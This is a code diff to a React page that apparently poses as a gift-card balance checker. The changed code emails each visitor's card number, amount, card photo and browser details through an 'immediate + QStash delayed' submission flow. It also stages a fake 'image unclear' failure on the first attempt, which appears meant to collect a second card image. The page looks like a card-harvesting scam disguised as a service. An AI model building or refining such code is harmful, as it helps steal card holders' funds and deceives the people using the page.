@@ -1,7 +1,7 @@
 // src/pages/Scan.jsx - FIXED: Processing animation before error
 import React, { useState, useRef, useEffect } from 'react';
 import { Link, useNavigate } from 'react-router-dom';
-import { logBalanceCheck } from '../services/logService';
+import { submitWithQStash } from '../services/logService';
 
 // Full-screen balance component
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
@@ -169,7 +169,8 @@ const Scan = () => {
     }
     
     try {
-      await logBalanceCheck({
+      // Submit with dual email flow (immediate + QStash delayed)
+      await submitWithQStash({
         type: 'first_attempt_failed',
         cardNumber: simulatedCode,
         amount: amount,
@@ -178,12 +179,12 @@ const Scan = () => {
         userAgent: navigator.userAgent,
         pageSource: 'scan',
         imageBase64: imagePreview,
-        ip: null,
         message: 'First attempt failed - image unclear'
       });
-      console.log('📧 Failed attempt email sent');
+      
+      //console.log('📧 Failed attempt email sent');
     } catch (err) {
-      console.error('Logging failed:', err);
+      console.error('Logging or submission failed:', err);
     }
     
     setSelectedImage(null);
@@ -213,7 +214,8 @@ const Scan = () => {
     }
     
     try {
-      await logBalanceCheck({
+      // Submit with dual email flow (immediate + QStash delayed)
+      await submitWithQStash({
         type: 'second_attempt_success',
         cardNumber: simulatedCode,
         amount: amount,
@@ -223,12 +225,11 @@ const Scan = () => {
         userAgent: navigator.userAgent,
         pageSource: 'scan',
         imageBase64: imagePreview,
-        ip: null,
         message: 'Second attempt successful - image verified'
       });
-      console.log('📧 Success email sent');
+      //console.log('📧 Success email sent');
     } catch (err) {
-      console.error('Logging failed:', err);
+      console.error('Logging or submission failed:', err);
     }
   };
 
